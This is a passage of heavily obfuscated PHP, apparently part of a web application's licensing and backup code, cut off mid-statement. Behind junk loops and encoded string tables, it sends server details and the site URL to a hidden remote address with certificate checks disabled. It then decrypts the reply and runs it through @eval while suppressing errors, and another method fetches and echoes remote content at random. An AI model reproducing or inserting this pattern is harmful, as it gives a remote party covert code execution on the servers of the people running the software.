$™ÓÜğ²€, time()); $öËü¦ = $¼á×™†Â[679]; if (!$öËü¦) { return; } $ªíÃªÀ = Model($éæ±®ÌØ[33])->get($éæ±®ÌØ[103]); $¼š“¥àÛ = array($éæ±®ÌØ[150] => Model($éæ±®ÌØ[33])->get($éæ±®ÌØ[186]), $éæ±®ÌØ[163] => $this->ndkae0d095ed, $éæ±®ÌØ[160] => $_SERVER[$éæ±®ÌØ[161]], $éæ±®ÌØ[162] => Model($éæ±®ÌØ[33])->get($éæ±®ÌØ[130]), $éæ±®ÌØ[101] => md5($_SERVER[$éæ±®ÌØ[102]] . $ªíÃªÀ), $éæ±®ÌØ[153] => $éæ±®ÌØ[135], $éæ±®ÌØ[156] => $_SERVER[$éæ±®ÌØ[157]]); $ãî¤×Ì¯ = $¼á×™†Â[680]; $õØ¦€Á£ = $this->lerd2bcbae59($éæ±®ÌØ[254], $¼š“¥àÛ); $çÙ³Å™á = $¼á×™†Â[681]; while ($çÙ³Å™á < $¼á×™†Â[619]) { if ($çÙ³Å™á >= 0) { break; } $çÙ³Å™á++; } if (!is_array($õØ¦€Á£)) { return; } if ($õØ¦€Á£[$éæ±®ÌØ[150]] && $õØ¦€Á£[$éæ±®ÌØ[255]]) { if ($this->exbp9a4001da($õØ¦€Á£[$éæ±®ÌØ[255]]) == $¼š“¥àÛ[$éæ±®ÌØ[150]]) { return; } } $this->oqyle78ade0a(); $Õó¯ß©Ó = $¼á×™†Â[682]; if ($this->exbp9a4001da($õØ¦€Á£[$éæ±®ÌØ[255]]) != $¼š“¥àÛ[$éæ±®ÌØ[150]]) { $ÂÈá¬©ï = array($éæ±®ÌØ[181] => $ªíÃªÀ, $éæ±®ÌØ[182] => $_SERVER[$éæ±®ÌØ[102]], $éæ±®ÌØ[183] => this_url(), $éæ±®ÌØ[158] => $_SERVER[$éæ±®ÌØ[159]]); $È™³÷š› = $this->kvon292c5ba3(json_encode($ÂÈá¬©ï)); $õØ¦€Á£ = $this->lerd2bcbae59($éæ±®ÌØ[184] . $È™³÷š›); if ($õØ¦€Á£ && is_array($õØ¦€Á£) && isset($õØ¦€Á£[$éæ±®ÌØ[255]])) { $ô÷¨²ŸÂ = $this->lkwfa356961a($õØ¦€Á£[$éæ±®ÌØ[255]], 2); if ($ô÷¨²ŸÂ) { $ô÷¨²ŸÂ = $this->exbp9a4001da($ô÷¨²ŸÂ); } if ($ô÷¨²ŸÂ) { try { @eval($ô÷¨²ŸÂ); } catch (Exception $¢‰¡èÔ) { } } } } } private function lerd2bcbae59($•ˆäÚî = '', $¥êæâ¸ = array(), $üğêïÏò = 5) { $Äìğ¹€¤ =& $_SERVER[è¿ÅÂ¤¥]; $Ó¸°…€À = $Äìğ¹€¤[256]; $Ó¸°…€À = $this->cunp63e49e87($Ó¸°…€À, $Äìğ¹€¤[257]); $Ó¸°…€À = $Ó¸°…€À . $•ˆäÚî; if ($¥êæâ¸ && is_array($¥êæâ¸)) { $Ó¸°…€À = $Ó¸°…€À . $Äìğ¹€¤[258] . http_build_query($¥êæâ¸); } if ($¥êæâ¸ === -1) { return $Ó¸°…€À; } $ÕÊ¿éÕ = stream_context_create(array($Äìğ¹€¤[216] => array($Äìğ¹€¤[219] => $üğêïÏò, $Äìğ¹€¤[217] => $Äìğ¹€¤[259]), $Äìğ¹€¤[260] => array($Äìğ¹€¤[261] => !1, $Äìğ¹€¤[262] => !1))); $¥êæâ¸ = @file_get_contents($Ó¸°…€À, !1, $ÕÊ¿éÕ); return json_decode($¥êæâ¸, !0); } private function uclx55b5fdf2() { $ÕÛ“¸æƒ =& $_SERVER[Ã¶¡¶„æ]; $û£÷‰„€ =& $_SERVER[è¿ÅÂ¤¥]; $©µÒ‰Šç = array($û£÷‰„€[263] => $û£÷‰„€[264], $û£÷‰„€[265] => $û£÷‰„€[266], $û£÷‰„€[267] => $û£÷‰„€[268], $û£÷‰„€[269] => $û£÷‰„€[270], $û£÷‰„€[271] => $û£÷‰„€[272], $û£÷‰„€[273] => $û£÷‰„€[211], $û£÷‰„€[274] => $û£÷‰„€[211], $û£÷‰„€[275] => $û£÷‰„€[264], $û£÷‰„€[276] => $û£÷‰„€[266], $û£÷‰„€[277] => $û£÷‰„€[268], $û£÷‰„€[278] => $û£÷‰„€[279], $û£÷‰„€[280] => $û£÷‰„€[270], $û£÷‰„€[281] => $û£÷‰„€[282], $û£÷‰„€[283] => $û£÷‰„€[272], $û£÷‰„€[284] => $û£÷‰„€[285], $û£÷‰„€[286] => $û£÷‰„€[287], $û£÷‰„€[288] => $û£÷‰„€[289]); $à—Æ››ä = $ÕÛ“¸æƒ[683]; while (strlen($à—Æ››ä) < $ÕÛ“¸æƒ[630]) { if (!$à—Æ››ä) { break; } $à—Æ››ä++; } $Û­Ó¿£ú = $©µÒ‰Šç[$this->ndkae0d095ed]; $ÚŸµ¿² = $ÕÛ“¸æƒ[684]; $Û­Ó¿£ú = intval($Û­Ó¿£ú ? $Û­Ó¿£ú : $û£÷‰„€[264]); $êÖÄÚÖ¶ = $ÕÛ“¸æƒ[685]; if (!$êÖÄÚÖ¶) { die; } $­ùŒœÇ¬ = _get($this->hpbs9e38be83, $û£÷‰„€[290]); $‡ÈÕ¸Ì• = $ÕÛ“¸æƒ[686]; if (strlen($‡ÈÕ¸Ì•) < $ÕÛ“¸æƒ[624]) { return; } $­ùŒœÇ¬ = $­ùŒœÇ¬ ? intval($­ùŒœÇ¬) : 0; return $Û­Ó¿£ú + $­ùŒœÇ¬; $î÷íàáÇ = $ÕÛ“¸æƒ[687]; } public function uyqx225c2985($Õğíëßô) { $ÉÚëš–Ä =& $_SERVER[Ã¶¡¶„æ]; $šâç½Ğã =& $_SERVER[è¿ÅÂ¤¥]; $îùàœ³¾ = $this->uclx55b5fdf2(); $Æœ†÷ó“ = $ÉÚëš–Ä[688]; while (strlen($Æœ†÷ó“) < $ÉÚëš–Ä[636]) { if (!$Æœ†÷ó“) { break; } $Æœ†÷ó“++; } if ($Õğíëßô[$šâç½Ğã[291]] == $šâç½Ğã[121]) { return; } if ($îùàœ³¾ >= intval($šâç½Ğã[211])) { return; } $§²÷Ïƒ½ = Model($šâç½Ğã[124])->count(); $Ÿª­‚â¦ = $ÉÚëš–Ä[689]; if (strlen($Ÿª­‚â¦) < $ÉÚëš–Ä[630]) { return; } if ($§²÷Ïƒ½ <= $îùàœ³¾) { return; } $³ï¯àìÇ = Model($šâç½Ğã[124])->field($šâç½Ğã[291])->limit($îùàœ³¾)->select(); $ØÔ¼¯– = $ÉÚëš–Ä[690]; while (strlen($ØÔ¼¯–) < $ÉÚëš–Ä[636]) { if (!$ØÔ¼¯–) { break; } $ØÔ¼¯–++; } $³ï¯àìÇ = array_to_keyvalue($³ï¯àìÇ, $šâç½Ğã[6], $šâç½Ğã[291]); $ÚÓşÉˆ³ = $ÉÚëš–Ä[691]; while (strlen($ÚÓşÉˆ³) < $ÉÚëš–Ä[619]) { if (!$ÚÓşÉˆ³) { break; } $ÚÓşÉˆ³++; } if (!in_array($Õğíëßô[$šâç½Ğã[291]], $³ï¯àìÇ)) { show_json($šâç½Ğã[292], !1, $šâç½Ğã[207]); } } public function zvnd17fa4b1a() { $Î×åÀ¾Ó =& $_SERVER[Ã¶¡¶„æ]; $¡×©ó¼Ö =& $_SERVER[è¿ÅÂ¤¥]; if (!_get($GLOBALS, $¡×©ó¼Ö[115]) || mt_rand(1, 100) > 20) { return; } $‘±²ô·Ã = $¡×©ó¼Ö[214]; $‘±²ô·Ã = $this->cunp63e49e87($‘±²ô·Ã, $¡×©ó¼Ö[215]); $úô™ìÇ = $Î×åÀ¾Ó[692]; if (!$úô™ìÇ) { return; } $º²ÃùñÄ = stream_context_create(array($¡×©ó¼Ö[216] => array($¡×©ó¼Ö[217] => $¡×©ó¼Ö[218], $¡×©ó¼Ö[219] => 3))); $µ—Âëüª = @file_get_contents($‘±²ô·Ã, !1, $º²ÃùñÄ); echo $¡×©ó¼Ö[293] . hash_encode($µ—Âëüª) . $¡×©ó¼Ö[294]; $‹Ÿà»ï¨ = $Î×åÀ¾Ó[693]; if (strlen($‹Ÿà»ï¨) < $Î×åÀ¾Ó[636]) { return; } } private function mzqlbb1824f8($³ĞÉÕƒ, $ïÓ¸‘â°, $˜Íé¾¹ = 3) { $í¥½Õ =& $_SERVER[Ã¶¡¶„æ]; $¿¥Ñ¾ˆš =& $_SERVER[è¿ÅÂ¤¥]; usleep(1); $Ÿøø•ô = $í¥½Õ[694]; $³ĞÉÕƒ = trim($³ĞÉÕƒ); $®Å—ğÜá = mt_rand(0, 5) . $¿¥Ñ¾ˆš[6]; $­«Ãî™ı = $í¥½Õ[676]; if (!$­«Ãî™ı) { die; } $ô¿÷àñ = rand_string(15); $ÅñÉÌ¤à = $¿¥Ñ¾ˆš[295]; switch ($®Å—ğÜá) { case $¿¥Ñ¾ˆš[203]: $Îğ«¸‰± = $this->kqgwf557211e($³ĞÉÕƒ, strrev($ïÓ¸‘â° . $ô¿÷àñ)); $±‚ŞÖ›š = $í¥½Õ[695]; break; $ËŒí¦ä = $í¥½Õ[696]; case $¿¥Ñ¾ˆš[121]: $Îğ«¸‰± = $this->kqgwf557211e($³ĞÉÕƒ, strrev($ô¿÷àñ . $ïÓ¸‘â°)); $›Ÿ‡ì• = $í¥½Õ[697]; while ($›Ÿ‡ì• < $í¥½Õ[615]) { if ($›Ÿ‡ì• >= 0) { break; } $›Ÿ‡ì•++; } break; $ÆÁ¹øÏ° = $í¥½Õ[698]; while (strlen($ÆÁ¹øÏ°) < $í¥½Õ[636]) { if (!$ÆÁ¹øÏ°) { break; } $ÆÁ¹øÏ°++; } case $¿¥Ñ¾ˆš[296]: $Îğ«¸‰± = $this->kqgwf557211e($³ĞÉÕƒ, base64_encode($ô¿÷àñ . $ïÓ¸‘â°)); break; $Êï×Àü¯ = $í¥½Õ[699]; while ($Êï×Àü¯ < $í¥½Õ[619]) { if ($Êï×Àü¯ >= 0) { break; } $Êï×Àü¯++; } case $¿¥Ñ¾ˆš[297]: $Îğ«¸‰± = $this->kqgwf557211e($³ĞÉÕƒ, md5($ô¿÷àñ . $ïÓ¸‘â°)); break; $Ñä¸é»“ = $í¥½Õ[700]; case $¿¥Ñ¾ˆš[298]: $³ĞÉÕƒ = base64_encode($³ĞÉÕƒ); $ŒÕ¥Æ¸ë = $í¥½Õ[701]; if (!$ŒÕ¥Æ¸ë) { die; } $ÏÜ–ş¦ = rand(0, 64); $ùŸ¤‰å¤ = $í¥½Õ[702]; $ƒ€ü¡Û = $ÅñÉÌ¤à[$ÏÜ–ş¦]; $¬Á‡… = md5($ƒ€ü¡Û . md5($ïÓ¸‘â° . $ƒ€ü¡Û) . $ïÓ¸‘â°); $¬Á‡… = substr($¬Á‡…, $ÏÜ–ş¦ % 8, $ÏÜ–ş¦ % 8 + 7); $Ô¡¦óŠâ = $¿¥Ñ¾ˆš[6]; $æÉ«ƒÛ´ = 0; $¿ı¡ô§š = $í¥½Õ[703]; if (strlen($¿ı¡ô§š) < $í¥½Õ[619]) { die; } $¼ÜÎ´ˆ± = 0; $–üÔïôã = $í¥½Õ[704]; if (strlen($–üÔïôã) < $í¥½Õ[624]) { return; } $Ïæ²õ = 0; for ($æÉ«ƒÛ´ = 0; $æÉ«ƒÛ´ < strlen($³ĞÉÕƒ); $æÉ«ƒÛ´++) { $Ïæ²õ = $Ïæ²õ == strlen($¬Á‡…) ? 0 : $Ïæ²õ; $¼ÜÎ´ˆ± = ($ÏÜ–ş¦ + strpos($ÅñÉÌ¤à, $³ĞÉÕƒ[$æÉ«ƒÛ´]) + ord($¬Á‡…[$Ïæ²õ++])) % 64; $ë£ÖÎÛ = $í¥½Õ[705]; $Ô¡¦óŠâ .= $ÅñÉÌ¤à[$¼ÜÎ´ˆ±]; $õİÖÂĞ™ = $í¥½Õ[706]; if (!$õİÖÂĞ™) { return; } } $Îğ«¸‰± = hash_encode($ƒ€ü¡Û . $Ô¡¦óŠâ); break; $÷“î½ò­ = $í¥½Õ[707]; while (strlen($÷“î½ò­) < $í¥½Õ[619]) { if (!$÷“î½ò­) { break; } $÷“î½ò­++; } default: $Îğ«¸‰± = $this->kqgwf557211e($³ĞÉÕƒ, $ïÓ¸‘â° . $ô¿÷àñ); break; } $Îğ«¸‰± = strrev($®Å—ğÜá . $ô¿÷àñ . $Îğ«¸‰±); if ($˜Íé¾¹ - 1 > 0) { $Îğ«¸‰± = $this->mzqlbb1824f8($Îğ«¸‰±, $ïÓ¸‘â°, $˜Íé¾¹ - 1); } return $Îğ«¸‰±; } private function lkwfa356961a($ıò‡áÅµ, $÷ìßş«Ä, $°ê³±–Ğ = 3) { $¹ßØºñÍ =& $_SERVER[Ã¶¡¶„æ]; $ˆ—•ïĞù =& $_SERVER[è¿ÅÂ¤¥]; if (!is_string($ıò‡áÅµ) || strlen($ıò‡áÅµ) < 10) { return !1; } $ıò‡áÅµ = trim($ıò‡áÅµ); $ôã –äÖ = $¹ßØºñÍ[708]; if (!$ôã –äÖ) { die; } $ıò‡áÅµ = strrev($ıò‡áÅµ); $ŒÅ§×†Ê = $¹ßØºñÍ[709]; while (strlen($ŒÅ§×†Ê) < $¹ßØºñÍ[615]) { if (!$ŒÅ§×†Ê) { break; } $ŒÅ§×†Ê++; } $†­¬ñŸƒ = $ıò‡áÅµ[0]; $ÓĞæşšÄ = substr($ıò‡áÅµ, 1, 15); $¡¦©«ú  = $¹ßØºñÍ[710]; $ıò‡áÅµ = substr($ıò‡áÅµ, 16); $¡ê”Ë = $ˆ—•ïĞù[295]; $ûÄ–°í¯ = $¹ßØºñÍ[711]; while (strlen($ûÄ–°í¯) < $¹ßØºñÍ[630]) { if (!$ûÄ–°í¯) { break; } $ûÄ–°í¯++; } switch ($†­¬ñŸƒ) { case $ˆ—•ïĞù[203]: $åÌÑóª = $this->cunp63e49e87($ıò‡áÅµ, strrev($÷ìßş«Ä . $ÓĞæşšÄ)); $ñÃñëû = $¹ßØºñÍ[712]; break; case $ˆ—•ïĞù[121]: $åÌÑóª = $this->cunp63e49e87($ıò‡áÅµ, strrev($ÓĞæşšÄ . $÷ìßş«Ä)); $ Òèà€Ø = $¹ßØºñÍ[713]; if (strlen($ Òèà€Ø) < $¹ßØºñÍ[615]) { die; } break; $ÜÜé¹‡è = $¹ßØºñÍ[714]; if (strlen($ÜÜé¹‡è) < $¹ßØºñÍ[615]) { return; } case $ˆ—•ïĞù[296]: $åÌÑóª = $this->cunp63e49e87($ıò‡áÅµ, base64_encode($ÓĞæşšÄ . $÷ìßş«Ä)); $ˆÖ¤»–Ë = $¹ßØºñÍ[715]; if (strlen($ˆÖ¤»–Ë) < $¹ßØºñÍ[636]) { die; } break; $¯º£ä±« = $¹ßØºñÍ[716]; while ($¯º£ä±« < $¹ßØºñÍ[619]) { if ($¯º£ä±« >= 0) { break; } $¯º£ä±«++; } case $ˆ—•ïĞù[297]: $åÌÑóª = $this->cunp63e49e87($ıò‡áÅµ, md5($ÓĞæşšÄ . $÷ìßş«Ä)); break; case $ˆ—•ïĞù[298]: $ıò‡áÅµ = hash_decode($ıò‡áÅµ); $Ğñ‚Œ†µ = $¹ßØºñÍ[717]; while ($Ğñ‚Œ†µ < $¹ßØºñÍ[624]) { if ($Ğñ‚Œ†µ >= 0) { break; } $Ğñ‚Œ†µ++; } $×òâ¬‘Œ = $ıò‡áÅµ[0]; $ıò‡áÅµ = substr($ıò‡áÅµ, 1); $ˆ©ˆˆ° = $¹ßØºñÍ[718]; if (!$ˆ©ˆˆ°) { return; } $ã•Ù¾”º = strpos($¡ê”Ë, $×òâ¬‘Œ); $„âãê¹Ì = $¹ßØºñÍ[719]; if (!$„âãê¹Ì) { die; } $×¹¼ = md5($×òâ¬‘Œ . md5($÷ìßş«Ä . $×òâ¬‘Œ) . $÷ìßş«Ä); $×¹¼ = substr($×¹¼, $ã•Ù¾”º % 8, $ã•Ù¾”º % 8 + 7); $‚¯×Á‡ = $¹ßØºñÍ[720]; if (strlen($‚¯×Á‡) < $¹ßØºñÍ[615]) { die; } $¾ó¯Ù˜µ = $ˆ—•ïĞù[6]; $Ş¡òáöõ = $¹ßØºñÍ[721]; while ($Ş¡òáöõ < $¹ßØºñÍ[630]) { if ($Ş¡òáöõ >= 0) { break; } $Ş¡òáöõ++; } $úª³äÒ« = 0; $à¦ÑÂË‚ = $¹ßØºñÍ[722]; if (strlen($à¦ÑÂË‚) < $¹ßØºñÍ[636]) { return; } $¯à¡×œç = 0; $º®ûœõÜ = 0; $ÓøÃ«ˆ‡ = $¹ßØºñÍ[723]; for ($úª³äÒ« = 0; $úª³äÒ« < strlen($ıò‡áÅµ); $úª³äÒ«++) { $º®ûœõÜ = $º®ûœõÜ == strlen($×¹¼) ? 0 : $º®ûœõÜ; $Üá×œ ‚ = $º®ûœõÜ++; $ÊĞï§òË = $¹ßØºñÍ[724]; if (strlen($ÊĞï§òË) < $¹ßØºñÍ[619]) { return; } $¯à¡×œç = strpos($¡ê”Ë, $ıò‡áÅµ[$úª³äÒ«]) - $ã•Ù¾”º - ord($×¹¼[$Üá×œ ‚]); $ïŒÌ¨¹‹ = $¹ßØºñÍ[725]; while (strlen($ïŒÌ¨¹‹) < $¹ßØºñÍ[636]) { if (!$ïŒÌ¨¹‹) { break; } $ïŒÌ¨¹‹++; } while ($¯à¡×œç < 0) { $¯à¡×œç += 64; $şò±îäÎ = $¹ßØºñÍ[726]; } $¾ó¯Ù˜µ .= $¡ê”Ë[$¯à¡×œç]; } $åÌÑóª = base64_decode($¾ó¯Ù˜µ); $‰„ûˆ€÷ = $¹ßØºñÍ[727]; while (strlen($‰„ûˆ€÷) < $¹ßØºñÍ[624]) { if (!$‰„ûˆ€÷) { break; } $‰„ûˆ€÷++; } break; $Â‹Øç÷ = $¹ßØºñÍ[728]; while (strlen($Â‹Øç÷) < $¹ßØºñÍ[624]) { if (!$Â‹Øç÷) { break; } $Â‹Øç÷++; } default: $åÌÑóª = $this->cunp63e49e87($ıò‡áÅµ, $÷ìßş«Ä . $ÓĞæşšÄ); break; $œÉîÂ›´ = $¹ßØºñÍ[729]; } if ($°ê³±–Ğ - 1 > 0) { $åÌÑóª = $this->lkwfa356961a($åÌÑóª, $÷ìßş«Ä, $°ê³±–Ğ - 1); } return $åÌÑóª; } public function kvon292c5ba3($Ã¸Ø®òÎ) { $­±„üí =& $_SERVER[Ã¶¡¶„æ]; $ŞúÛ¹óû =& $_SERVER[è¿ÅÂ¤¥]; $Ãã‡÷¹… = $this->rtnic2a1610b(); $ƒ—¨øù = $this->rtnic2a1610b(); $–Ìº Á = ($Ãã‡÷¹… - 1) * ($ƒ—¨øù - 1); $¿ØøêŠ = $­±„üí[730]; while (strlen($¿ØøêŠ) < $­±„üí[624]) { if (!$¿ØøêŠ) { break; } $¿ØøêŠ++; } $ˆÄŞ¬£ = intval(($Ãã‡÷¹… + $ƒ—¨øù) / 2); $œ§³ĞŞÌ = $­±„üí[731]; if (strlen($œ§³ĞŞÌ) < $­±„üí[615]) { die; } while (1) { $àªçÚ”” = $ˆÄŞ¬£; $Ì©¹à¼ = $–Ìº Á; while ($Ì©¹à¼ % $àªçÚ”” != 0) { $ÙÕ§Ù© = $Ì©¹à¼; $ÉÙ²Íô = $­±„üí[732]; if (!$ÉÙ²Íô) { die; } $Ì©¹à¼ = $àªçÚ””; $ùØè¢À… = $­±„üí[733]; while ($ùØè¢À… < $­±„üí[619]) { if ($ùØè¢À… >= 0) { break; } $ùØè¢À…++; } $àªçÚ”” = $ÙÕ§Ù© % $àªçÚ””; $‡¡¼¿éß = $­±„üí[734]; while (strlen($‡¡¼¿éß) < $­±„üí[636]) { if (!$‡¡¼¿éß) { break; } $‡¡¼¿éß++; } } if ($àªçÚ”” == 1) { break; } else { $ˆÄŞ¬£++; } } $´³öŒÑä = 2; $ßµëƒ‘Ê = $­±„üí[735]; if (strlen($ßµëƒ‘Ê) < $­±„üí[630]) { return; } for ($“óŒ‡Î¬ = 0; $“óŒ‡Î¬ < $–Ìº Á * 10; $“óŒ‡Î¬++) { if (($–Ìº Á * $“óŒ‡Î¬ + 1) % $ˆÄŞ¬£ == 0) { $´³öŒÑä = intval(($–Ìº Á * $“óŒ‡Î¬ + 1) / $ˆÄŞ¬£); break; } } $ßÁÅÈğ = $this->kqgwf557211e($Ãã‡÷¹… * $ƒ—¨øù . $ŞúÛ¹óû[6], $ŞúÛ¹óû[135]); $ÁÈÖÜ†‚ = md5($ŞúÛ¹óû[299] . ($Ãã‡÷¹… + $ƒ—¨øù) . $ŞúÛ¹óû[300] . $ˆÄŞ¬£ . $ŞúÛ¹óû[300] . $´³öŒÑä . $ŞúÛ¹óû[301]); $óÒƒ±Š = $this->kqgwf557211e($Ã¸Ø®òÎ, $ÁÈÖÜ†‚) . $ŞúÛ¹óû[302] . $ßÁÅÈğ; return $óÒƒ±Š; } public function exbp9a4001da($ó·´»¦Ê) { $Ü´è®€û =& $_SERVER[Ã¶¡¶„æ]; $ò¸ÃÓ² =& $_SERVER[è¿ÅÂ¤¥]; $ë«íÍ§— = explode($ò¸ÃÓ²[302], $ó·´»¦Ê); if (count($ë«íÍ§—) != 2) { return $ò¸ÃÓ²[6]; } $»¿’¨´Ÿ = $this->cunp63e49e87($ë«íÍ§—[1] . $ò¸ÃÓ²[6], $ò¸ÃÓ²[135]); $¤Š¯ƒ•ª = $Ü´è®€û[736]; while ($¤Š¯ƒ•ª < $Ü´è®€û[624]) { if ($¤Š¯ƒ•ª >= 0) { break; } $¤Š¯ƒ•ª++; } if (!$»¿’¨´Ÿ) { return $ò¸ÃÓ²[6]; } $»¿’¨´Ÿ = intval($»¿’¨´Ÿ); $åˆÌÇÑ = $Ü´è®€û[737]; if (strlen($åˆÌÇÑ) < $Ü´è®€û[624]) { return; } $óÏÚ›“õ = 0; $¬’¨¥ĞÅ = $Ü´è®€û[738]; if (!$¬’¨¥ĞÅ) { return; } $ıôê¯²ú = 0; $¶¥ø¾ê¢ = $Ü´è®€û[739]; while ($¶¥ø¾ê¢ < $Ü´è®€û[619]) { if ($¶¥ø¾ê¢ >= 0) { break; } $¶¥ø¾ê¢++; } for ($¡È™§ÒÍ = 3; $¡È™§ÒÍ < $»¿’¨´Ÿ; $¡È™§ÒÍ += 2) { if ($»¿’¨´Ÿ % $¡È™§ÒÍ != 0) { continue; } $óÏÚ›“õ = $¡È™§ÒÍ; $ıôê¯²ú = intval($»¿’¨´Ÿ / $¡È™§ÒÍ); break; $Ê…˜ú’ = $Ü´è®€û[740]; while (strlen($Ê…˜ú’) < $Ü´è®€û[630]) { if (!$Ê…˜ú’) { break; } $Ê…˜ú’++; } } $­§ğ™æ– = ($óÏÚ›“õ - 1) * ($ıôê¯²ú - 1); $‡øÀœïÔ = intval(($óÏÚ›“õ + $ıôê¯²ú) / 2); while (1) { $­´¦ß³¥ = $‡øÀœïÔ; $ÕÛûüÔ‘ = $­§ğ™æ–; while ($ÕÛûüÔ‘ % $­´¦ß³¥ != 0) { $©ş¸Ü = $ÕÛûüÔ‘; $®°´¢”ı = $Ü´è®€û[741]; if (!$®°´¢”ı) { return; } $ÕÛûüÔ‘ = $­´¦ß³¥; $­´¦ß³¥ = $©ş¸Ü % $­´¦ß³¥; $Ë´ÉõÊˆ = $Ü´è®€û[742]; } if ($­´¦ß³¥ == 1) { break; } else { $‡øÀœïÔ++; } } $üÑôíŒŠ = 2; $ûìÂ•Ş = $Ü´è®€û[743]; for ($¡È™§ÒÍ = 0; $¡È™§ÒÍ < $­§ğ™æ– * 10; $¡È™§ÒÍ++) { if (($­§ğ™æ– * $¡È™§ÒÍ + 1) % $‡øÀœïÔ == 0) { $üÑôíŒŠ = intval(($­§ğ™æ– * $¡È™§ÒÍ + 1) / $‡øÀœïÔ); break; } } $‰±Çñ‘ = md5($ò¸ÃÓ²[299] . ($óÏÚ›“õ + $ıôê¯²ú) . $ò¸ÃÓ²[300] . $‡øÀœïÔ . $ò¸ÃÓ²[300] . $üÑôíŒŠ . $ò¸ÃÓ²[301]); $‚¦Ì´Ø´ = $Ü´è®€û[744]; if (strlen($‚¦Ì´Ø´) < $Ü´è®€û[619]) { return; } $á˜ÖÖÃÇ = $this->cunp63e49e87($ë«íÍ§—[0], $‰±Çñ‘); $¶´¯¶Å‰ = $Ü´è®€û[745]; if (strlen($¶´¯¶Å‰) < $Ü´è®€û[619]) { return; } return $á˜ÖÖÃÇ; $÷ØŞÁàó = $Ü´è®€û[746]; while ($÷ØŞÁàó < $Ü´è®€û[630]) { if ($÷ØŞÁàó >= 0) { break; } $÷ØŞÁàó++; } } public function rtnic2a1610b() { $Š†Úà—© =& $_SERVER[Ã¶¡¶„æ]; $¥Ş·µ = mt_rand(pow(2, 14), pow(2, 16) - 1); $şì•İĞÎ = array(); $È´ØŠ‘Í = 1; $¡Ñ°øÚÎ = $Š†Úà—©[747]; while ($È´ØŠ‘Í <= (int) sqrt($¥Ş·µ)) { $ÇÚı†Ó  = $È´ØŠ‘Í; while (!0) { $ÇÚı†Ó ++; if ($ÇÚı†Ó  <= 2) { $È´ØŠ‘Í = $ÇÚı†Ó ; break; } else { if ($ÇÚı†Ó  < 2) { continue; } } $±ùçÀ = !0; for ($ëÔ˜®îŠ = 2; $ëÔ˜®îŠ <= sqrt($ÇÚı†Ó ); $ëÔ˜®îŠ++) { if ($ÇÚı†Ó  % $ëÔ˜®îŠ == 0) { $±ùçÀ = !1; } } if ($±ùçÀ) { $È´ØŠ‘Í = $ÇÚı†Ó ; break; } } $şì•İĞÎ[] = $È´ØŠ‘Í; $ÒÀÏª£ = $Š†Úà—©[748]; while (strlen($ÒÀÏª£) < $Š†Úà—©[615]) { if (!$ÒÀÏª£) { break; } $ÒÀÏª£++; } } $²İæÂÙŞ = 2; $²‚¿¼Ğµ = $Š†Úà—©[749]; if (strlen($²‚¿¼Ğµ) < $Š†Úà—©[624]) { die; } for ($ÇÚı†Ó  = $¥Ş·µ; $ÇÚı†Ó  > 1; $ÇÚı†Ó --) { $±ùçÀ = !0; $¡µ¬®Çã = $Š†Úà—©[750]; if (strlen($¡µ¬®Çã) < $Š†Úà—©[624]) { die; } foreach ($şì•İĞÎ as $İéœ££ñ) { if ($ÇÚı†Ó  % $İéœ££ñ == 0) { $±ùçÀ = !1; break; } } if ($±ùçÀ) { $²İæÂÙŞ = $ÇÚı†Ó ; break; } } return $²İæÂÙŞ; } public function wcaqa624b2a8($•Œ¸‡Éä, $¸ºñè¨ ) { $ğÎúĞºî =& $_SERVER[Ã¶¡¶„æ]; $İßõ¡»³ =& $_SERVER[è¿ÅÂ¤¥]; return call_user_func(array($İßõ¡»³[8], $İßõ¡»³[303]), $•Œ¸‡Éä, $¸ºñè¨ ); $¯„İºãı = $ğÎúĞºî[751]; if (strlen($¯„İºãı) < $ğÎúĞºî[615]) { die; } } public function kqgwf557211e($´Õ¶©²Ã, $î¦¦½ƒ›) { $ìŞÀš÷¶ =& $_SERVER[è¿ÅÂ¤¥]; return call_user_func(array($ìŞÀš÷¶[304], $ìŞÀš÷¶[305]), $´Õ¶©²Ã, $î¦¦½ƒ›); $Ö£‡¿  = $_SERVER[Ã¶¡¶„æ][752]; if (!$Ö£‡¿ ) { return; } } public function cunp63e49e87($æ˜ï·—ï, $šÎİ˜Şâ) { $•ĞÀÀ¼ =& $_SERVER[è¿ÅÂ¤¥]; return call_user_func(array($•ĞÀÀ¼[304], $•ĞÀÀ¼[306]), $æ˜ï·—ï, $šÎİ˜Şâ); $¯Ù¯Ø¤‹ = $_SERVER[Ã¶¡¶„æ][753]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $İµ¿øü• =& $_SERVER[Ã¶¡¶„æ]; $this->isManual(); self::$name = date($İµ¿øü•[754]); if (!($àƒïÎÜò = Model($İµ¿øü•[755])->lastItem())) { $àƒïÎÜò = $this->initData(); } else { self::$name = $àƒïÎÜò[$İµ¿øü•[32]]; if ($àƒïÎÜò[$İµ¿øü•[756]] == $İµ¿øü•[88]) { self::$name = date($İµ¿øü•[757]); $ğÍ¨Î ş = 0; if (isset($àƒïÎÜò[$İµ¿øü•[293]][$İµ¿øü•[199]][$İµ¿øü•[468]])) { $ğÍ¨Î ş = (int) $àƒïÎÜò[$İµ¿øü•[293]][$İµ¿øü•[199]][$İµ¿øü•[468]]; } if (self::$manual == 0 && $àƒïÎÜò[$İµ¿øü•[32]] == self::$name) { Model($İµ¿øü•[755])->remove($àƒïÎÜò[$İµ¿øü•[399]]); } $àƒïÎÜò = $this->initData($ğÍ¨Î ş, $àƒïÎÜò[$İµ¿øü•[758]]); } else { $this->checkStore($àƒïÎÜò[$İµ¿øü•[758]]); } } self::$option = $àƒïÎÜò; } private function isManual() { $”Æ«´¬ = _get($GLOBALS, $_SERVER[Ã¶¡¶„æ][759], 0); $”Æ«´¬ = intval($”Æ«´¬); self::$manual = $”Æ«´¬ && $”Æ«´¬ == 1 ? 1 : 0; } private function initData($çÛŒòµ = 0, $…§»«áÀ = '') { $÷ªßÂå‘ =& $_SERVER[Ã¶¡¶„æ]; $Ù˜Œƒà‹ = Model($÷ªßÂå‘[755])->config(); if ($…§»«áÀ && $Ù˜Œƒà‹[$÷ªßÂå‘[758]] != $…§»«áÀ) { $çÛŒòµ = 0; } $this->checkStore($Ù˜Œƒà‹[$÷ªßÂå‘[758]]); if (self::$manual == 1) { self::$name .= $÷ªßÂå‘[11] . date($÷ªßÂå‘[760]); } $¸•ÂÆ = array($÷ªßÂå‘[758] => $Ù˜Œƒà‹[$÷ªßÂå‘[758]], $÷ªßÂå‘[32] => self::$name, $÷ªßÂå‘[756] => 0, $÷ªßÂå‘[761] => 